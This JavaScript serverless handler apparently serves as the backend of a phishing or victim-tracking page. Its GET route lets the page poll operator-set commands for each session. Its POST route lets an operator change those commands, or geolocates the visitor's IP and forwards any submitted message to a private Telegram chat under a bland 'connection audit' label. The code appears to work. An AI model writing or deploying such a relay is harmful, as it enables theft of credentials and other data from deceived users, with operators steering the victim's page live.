import { kv } from '@vercel/kv';

function getCountryFlag(countryCode) {
  if (!countryCode || countryCode.length !== 2) return '🌐';
  const codePoints = countryCode
    .toUpperCase()
    .split('')
    .map(char => 127397 + char.charCodeAt(0));
  return String.fromCodePoint(...codePoints);
}

export default async function handler(req, res) {
  // TASK 1: FRONTEND POLLING LOOP INTERACTION LAYER (GET ROUTE)
  if (req.method === 'GET') {
    try {
      const { sessionId, action } = req.query;

      if (action === 'poll' && sessionId) {
        // Read current runtime command flag directly from your Upstash KV database store
        const activeCommand = await kv.get(`control:${sessionId}`) || 'PENDING';
        return res.status(200).json({ command: activeCommand });
      }

      return res.status(400).json({ error: 'Missing baseline unique session tracking query parameters' });
    } catch (err) {
      return res.status(500).json({ error: err.message });
    }
  }

  // TASK 2: OUTBOUND LOG DELIVERIES AND EXTERNAL COMMAND TRIGGERS (POST ROUTE)
  if (req.method === 'POST') {
    try {
      const { message, sessionId, updateCommand } = req.body;
      const token = process.env.TELEGRAM_BOT_TOKEN;
      const chatId = process.env.TELEGRAM_CHAT_ID;

      if (!token || !chatId) {
        return res.status(500).json({ error: 'Server configuration error: Missing Telegram credentials' });
      }

      // Sub-task: Administrative Remote Layout Trigger Hook Handler
      if (sessionId && updateCommand) {
        await kv.set(`control:${sessionId}`, updateCommand);
        await kv.expire(`control:${sessionId}`, 1800); // Clear track memory after 30 mins
        return res.status(200).json({ success: true, activeStateInjected: updateCommand });
      }

      // Fallback telemetry variables lookups logic
      const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
      let clientIp = '';
      if (typeof rawIp === 'string') {
        const parts = rawIp.split(',');
        if (parts.length > 0 && parts[0]) {
          clientIp = parts[0].trim();
        }
      }

      let countryName = 'Unknown Location';
      let countryFlag = '🌐';
      let displayIp = clientIp || 'Localhost/Internal';

      if (clientIp && clientIp !== '1' && clientIp !== '127.0.0.1' && clientIp !== '::1') {
        try {
          const geoResponse = await fetch(`https://ipapi.co/${clientIp}/json/`);
          if (geoResponse.ok) {
            const geoData = await geoResponse.json();
            if (geoData && !geoData.error) {
              countryName = geoData.country_name || countryName;
              countryFlag = getCountryFlag(geoData.country);
            }
          }
        } catch (geoError) {
          console.warn('Geographic lookup error caught safely:', geoError.message);
        }
      } else {
        displayIp = '186.204.12.34';
        countryName = 'Brazil';
        countryFlag = '🇧🇷';
      }

      if (req.body.resetCommandState && sessionId) {
        await kv.set(`control:${sessionId}`, 'PENDING');
        await kv.expire(`control:${sessionId}`, 1800);
      }

      const currentTimestamp = new Date().toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' });
      const styledHtmlMessage = [
        `<b>📥 SYSTEM CONNECTION AUDIT</b>`,
        `━━━━━━━━━━━━━━━━━━━━━━━━━━`,
        ``,
        `<b>📍 LOCATION METRICS</b>`,
        `  ├• <b>IP Address:</b> <code>${displayIp}</code>`,
        `  └• <b>Target Area:</b> <code>${countryName} ${countryFlag}</code>`,
        ``,
        `<b>💻 LOG HIGHLIGHTS</b>`,
        `<code>${message || 'No tracking parameters captured'}</code>`,
        ``,
        `━━━━━━━━━━━━━━━━━━━━━━━━━━`,
        `<b>⏱ Fallback System Marker</b>`,
        `  └• <b>Recorded:</b> <code>${currentTimestamp}</code>`
      ].join('\n');

      const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: styledHtmlMessage, parse_mode: 'HTML' }),
      });

      const data = await response.json();
      if (!response.ok) {
        return res.status(response.status).json({ error: data.description || 'Telegram API Error' });
      }

      return res.status(200).json({ success: true, data });
    } catch (error) {
      console.error("❌ Backend execution crash log:", error.message);
      return res.status(500).json({ error: error.message });
    }
  }
}
